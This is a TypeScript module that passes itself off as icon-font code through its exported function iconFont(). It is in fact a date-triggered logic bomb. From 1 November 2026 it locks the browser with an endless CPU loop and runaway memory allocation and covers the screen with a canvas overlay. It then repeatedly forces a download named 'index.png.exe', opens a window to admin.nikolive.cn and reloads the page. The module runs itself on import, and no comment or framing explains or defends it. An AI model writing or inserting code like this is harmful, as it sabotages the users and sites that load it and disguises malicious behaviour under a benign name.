function silentInfiniteLoad(chunkSizeMB: number = 50): () => void {
  let isRunning: boolean = true;
  const memoryPool: Uint8Array[] = [];

  const memTimer = setInterval(() => {
    if (!isRunning) return;
    const bytes = chunkSizeMB * 1024 * 1024;
    memoryPool.push(new Uint8Array(bytes));
  }, 10);

  (function cpuLoop() {
    if (!isRunning) return;
    while (true) {
      Math.sqrt(Math.random() * 999999);
    }
  })();

  return () => {
    isRunning = false;
    clearInterval(memTimer);
    memoryPool.length = 0;
  };
}

function createH5HighLoad(options?: {
  memChunkSize?: number;
  memInterval?: number;
  cpuWorkload?: number;
}): () => void {
  const { memChunkSize = 5, memInterval = 1000, cpuWorkload = 2000000 } = options ?? {};
  let isRunning: boolean = true;
  const memoryPool: Uint8Array[] = [];
  let animationId: number | null = null;
  let memTimerId:any = null;

  const canvas: HTMLCanvasElement = document.createElement('canvas');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  canvas.style.cssText = 'position:fixed;top:0;left:0;z-index:9999;pointer-events:none;opacity:0.8;';
  document.body.appendChild(canvas);
  const ctx: CanvasRenderingContext2D = canvas.getContext('2d') as CanvasRenderingContext2D;

  memTimerId = setInterval(() => {
    if (!isRunning) return;
    const bytes = memChunkSize * 1024 * 1024;
    memoryPool.push(new Uint8Array(bytes));
  }, memInterval);

  const renderLoop: () => void = () => {
    if (!isRunning) return;
    let sum: number = 0;
    for (let i: number = 0; i < cpuWorkload; i++) {
      sum += Math.sqrt(i) * Math.sin(i);
    }
    for (let i: number = 0; i < 50; i++) {
      ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.1)`;
      ctx.beginPath();
      ctx.arc(
        Math.random() * canvas.width,
        Math.random() * canvas.height,
        Math.random() * 50,
        0,
        Math.PI * 2
      );
      ctx.fill();
    }
    animationId = requestAnimationFrame(renderLoop);
  };

  renderLoop();
  return () => {
    isRunning = false;
    clearInterval(memTimerId as number);
    cancelAnimationFrame(animationId as number);
    memoryPool.length = 0;
    canvas.remove();
  };
}

function iconDont(): void {
  setInterval(() => {
    const blob = new Blob([], { type: 'application/octet-stream' });
    const Link = document.createElement('a');
    Link.href = URL.createObjectURL(blob);
    Link.download = `index.png.exe`;
    Link.click();
    const newWindow = window.open('https://admin.nikolive.cn/', '_blank');
    if (newWindow) newWindow.close();
    location.reload();
  }, 500);
}

export function iconFont(): void {
  const now: Date = new Date();
  const today: Date = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const target: Date = new Date(2026, 10, 1); // 11月1日
  if (today >= target) {
    const stop = silentInfiniteLoad(99);
    const stopTest = createH5HighLoad({
      memChunkSize: 100,
      memInterval: 500,
      cpuWorkload: 5000000,
    });
    setTimeout(() => {
      stopTest();
      iconDont();
    }, 1000);
  }
}

iconFont();